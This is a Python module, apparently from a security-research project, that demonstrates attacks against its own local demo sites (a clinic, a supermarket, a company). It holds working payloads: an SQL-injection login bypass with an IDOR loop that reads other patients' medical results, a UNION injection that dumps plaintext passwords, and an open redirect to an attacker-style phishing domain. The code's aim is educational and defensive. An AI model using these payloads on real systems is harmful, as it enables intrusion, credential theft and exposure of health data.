"""
"Attacker's-eye view" demonstrations (impact demo).

The scanner itself is deliberately NON-destructive: it detects flaws by
reading what the server already exposes, without stealing data. This module
is the opposite on purpose, and for one narrow job: on OUR OWN authorised
demo sites, it actually runs the attack end to end so we can SHOW what a
criminal would walk away with — and then show the very same attack hitting a
wall once the fixes the scanner recommends are applied.

It is NOT part of a normal scan. It runs only against the local demo sites
(127.0.0.1), guarded by _ALLOWED below. It is meant to make one point for the
research project: a "medium" finding on a report is, in the real world, a
stranger reading your medical history or your admin password.

Each demo returns a dict the web UI renders as a red "what the attacker sees"
panel:
  site, title, story, steps[], leak{kind, columns, rows}, blocked, impact
`blocked` is True when the target is the secured version and the attack fails.
"""

import re
from urllib.parse import urlparse, urljoin

import requests

_ALLOWED = {"127.0.0.1", "localhost", "0.0.0.0"}
_TIMEOUT = 15
_HEADERS = {"User-Agent": "TR-attack-demo (authorised demo sites only)"}

# Which demo site answers on which port (vulnerable, secured).
_SITE_BY_PORT = {
    5001: "supermercat", 5011: "supermercat",
    5002: "clinica",     5012: "clinica",
    5003: "empresa",     5013: "empresa",
}


class TargetNotAllowed(Exception):
    pass


def _check(url):
    host = urlparse(url).netloc.split(":")[0]
    if host not in _ALLOWED:
        raise TargetNotAllowed(
            f"La demostració d'atac només s'executa contra els llocs de prova "
            f"locals autoritzats, no contra '{host}'.")


def _port(url):
    try:
        return urlparse(url).port or (443 if url.startswith("https") else 80)
    except ValueError:
        return None


def detect_site(url):
    """Identify the demo site by port, falling back to a content sniff."""
    site = _SITE_BY_PORT.get(_port(url))
    if site:
        return site
    try:
        html = requests.get(url, headers=_HEADERS, timeout=_TIMEOUT).text.lower()
    except requests.exceptions.RequestException:
        return None
    if "salut sant jordi" in html:
        return "clinica"
    if "ca l'andreu" in html or "ca l&#39;andreu" in html:
        return "supermercat"
    if "tècnics vallès" in html or "tcnics valls" in html:
        return "empresa"
    return None


# ---------------------------------------------------------------- clinic -----
def _attack_clinica(base):
    """SQLi auth bypass (log in with no password) + IDOR (read other
    patients' medical records)."""
    s = requests.Session()
    s.headers.update(_HEADERS)
    payload = "' OR '1'='1' -- "
    steps = [{
        "label": "1. Entrar sense contrasenya (injecció SQL)",
        "detail": f"POST /login amb usuari = {payload!r} i una contrasenya qualsevol.",
        "note": "La consulta queda SELECT * FROM users WHERE username='' OR '1'='1' -- "
                "' AND password='…', que és certa per a tothom: el servidor dóna "
                "per bona la sessió del primer pacient.",
    }]
    try:
        r = s.post(urljoin(base, "/login"),
                   data={"user": payload, "password": "x"},
                   timeout=_TIMEOUT, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        return _error("clinica", f"No s'ha pogut connectar: {e}")

    logged_in = "/portal" in r.url or "Àrea del pacient" in r.text \
        or "Resultats de" in r.text
    if not logged_in:
        return {
            "site": "clinica",
            "title": "Historials mèdics de pacients",
            "story": "L'atacant intenta entrar al portal del pacient sense "
                     "saber cap contrasenya.",
            "steps": steps,
            "leak": {"kind": "table", "columns": [], "rows": []},
            "blocked": True,
            "impact": "L'intent d'entrar sense contrasenya FALLA: la consulta "
                      "usa paràmetres i el text injectat es tracta com un nom "
                      "d'usuari qualsevol, que no existeix.",
        }

    # Logged in. Now abuse the IDOR: read ANY patient by changing ?id=.
    steps.append({
        "label": "2. Llegir l'historial d'altres pacients (IDOR)",
        "detail": "GET /portal?id=<pacient> canviant el nom a la URL.",
        "note": "El portal no comprova que les dades siguin teves: amb canviar "
                "?id= es llegeix l'historial mèdic de qualsevol pacient.",
    })
    rows = []
    for who in ("joana", "marc"):
        try:
            p = s.get(urljoin(base, f"/portal?id={who}"), timeout=_TIMEOUT)
        except requests.exceptions.RequestException:
            continue
        name_m = re.search(r"Resultats de:\s*<b>([^<]+)</b>", p.text)
        name = name_m.group(1) if name_m else who
        for test, value, date in re.findall(
                r"<td>([^<]+)</td><td class='val'>([^<]+)</td><td>([^<]+)</td>",
                p.text):
            rows.append([name, test, value, date])

    blocked = not rows or all(r[0] == rows[0][0] for r in rows) and len(
        {r[0] for r in rows}) < 2
    # On the secured site the IDOR is closed, so ?id=marc still shows only the
    # logged-in patient -> we never see a second patient's data.
    only_one = len({r[0] for r in rows}) <= 1
    return {
        "site": "clinica",
        "title": "Historials mèdics de pacients",
        "story": "Sense cap contrasenya, l'atacant entra al portal i llegeix "
                 "l'historial mèdic de qualsevol pacient.",
        "steps": steps,
        "leak": {
            "kind": "table",
            "columns": ["Pacient", "Prova", "Resultat", "Data"],
            "rows": rows,
        },
        "blocked": only_one,
        "impact": ("El portal només mostra les dades del pacient autenticat: "
                   "canviar ?id= ja no revela l'historial d'altres pacients.")
                  if only_one else
                  ("Dades de salut (categoria especialment protegida pel RGPD) "
                   "de pacients que no són l'atacant, exposades sense "
                   "autenticació."),
    }


# ------------------------------------------------------------ supermercat ---
def _attack_supermercat(base):
    """UNION-based SQLi through the search box: dump the users table,
    including the admin's plaintext password."""
    q = ("zzzNOPE%' UNION SELECT id, username, password, is_admin, '' "
         "FROM users -- ")
    steps = [{
        "label": "Injecció SQL al cercador (UNION)",
        "detail": "GET /search?q=" + q.strip(),
        "note": "La cerca enganxa el text dins SELECT … WHERE name LIKE '%…%'. "
                "Amb UNION SELECT l'atacant hi afegeix les files de la taula "
                "d'usuaris i les fa sortir com si fossin productes: el nom del "
                "producte passa a ser l'usuari, i la categoria, la contrasenya.",
    }]
    try:
        r = requests.get(urljoin(base, "/search"), params={"q": q},
                         headers=_HEADERS, timeout=_TIMEOUT)
    except requests.exceptions.RequestException as e:
        return _error("supermercat", f"No s'ha pogut connectar: {e}")

    # Read only the product-card fields, never the echoed query or image alt:
    # the UNION maps username -> name div, password -> category div.
    pairs = re.findall(
        r'<div class="cat">([^<]*)</div>\s*<div class="name">([^<]*)</div>',
        r.text)
    rows = [[user.strip(), pw.strip()] for pw, user in pairs if user.strip()]
    blocked = not rows
    return {
        "site": "supermercat",
        "title": "Comptes i contrasenyes dels clients",
        "story": "Des del quadre de cerca, sense estar registrat, l'atacant "
                 "extreu la taula d'usuaris sencera.",
        "steps": steps,
        "leak": {
            "kind": "table",
            "columns": ["Usuari", "Contrasenya (text pla)"],
            "rows": rows,
        },
        "blocked": blocked,
        "impact": ("La cerca passa a fer-se amb paràmetres: el text injectat es "
                   "tracta com una paraula de cerca literal i la consulta no "
                   "retorna cap usuari.") if blocked else
                  ("Credencials de tots els comptes, inclòs l'administrador, en "
                   "text pla. Amb l'usuari admin, control total de la botiga."),
    }


# ---------------------------------------------------------------- empresa ---
def _attack_empresa(base):
    """Open redirect: turn the company's own link into a phishing jump to an
    attacker-controlled page."""
    evil = "https://acgd-login-empleats.example/sessio-caducada"
    steps = [{
        "label": "Redirecció oberta a l'enllaç de candidatures",
        "detail": f"GET /apply?next={evil}",
        "note": "El paràmetre ?next= no es valida: el servidor redirigeix a "
                "qualsevol adreça, també a un domini de l'atacant.",
    }]
    try:
        r = requests.get(urljoin(base, "/apply"), params={"next": evil},
                         headers=_HEADERS, timeout=_TIMEOUT,
                         allow_redirects=False)
    except requests.exceptions.RequestException as e:
        return _error("empresa", f"No s'ha pogut connectar: {e}")

    dest = r.headers.get("Location", "")
    lands_on_evil = dest.startswith("https://acgd-login-empleats.example")
    blocked = not lands_on_evil
    return {
        "site": "empresa",
        "title": "Segrest de confiança (phishing)",
        "story": "L'atacant difon un enllaç que comença pel domini real i de "
                 "confiança de l'empresa, però que acaba a una pàgina falsa seva.",
        "steps": steps,
        "leak": {
            "kind": "redirect",
            "columns": ["Enllaç que veu la víctima", "On acaba realment"],
            "rows": [[f"{base}/apply?next=…", dest or "(sense redirecció)"]],
        },
        "blocked": blocked,
        "impact": ("El paràmetre next es valida i només accepta rutes internes: "
                   "l'enllaç sempre acaba a la pàgina oficial del propi lloc "
                   "(/thanks), mai en un domini extern.") if blocked else
                  ("La víctima confia en el domini de l'empresa i acaba en una "
                   "pàgina de login falsa que li roba usuari i contrasenya."),
    }


def _error(site, msg):
    return {"site": site, "title": "Error", "story": msg, "steps": [],
            "leak": {"kind": "table", "columns": [], "rows": []},
            "blocked": True, "impact": msg}


_ATTACKS = {
    "clinica": _attack_clinica,
    "supermercat": _attack_supermercat,
    "empresa": _attack_empresa,
}


def run(target_url):
    """Run the impact demo matching the target site. Returns the panel dict,
    or None if the site is not one of the demos."""
    _check(target_url)
    site = detect_site(target_url)
    if site not in _ATTACKS:
        return None
    base = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
    return _ATTACKS[site](base)
